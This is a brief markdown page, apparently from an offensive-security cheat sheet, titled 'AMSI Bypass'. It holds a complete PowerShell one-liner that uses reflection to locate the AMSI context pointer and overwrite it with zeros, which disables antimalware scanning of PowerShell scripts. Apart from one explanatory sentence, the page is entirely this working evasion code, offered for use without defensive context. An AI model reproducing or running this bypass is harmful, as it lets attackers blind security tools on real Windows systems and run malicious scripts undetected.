---
title: "AMSI Bypass"
---

# AMSI Bypass

One-liner that corrupts the AMSI context pointer via reflection, disabling PowerShell script scanning without modifying any on-disk binaries. Works by overwriting the AMSI context buffer with a zero array.

```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```
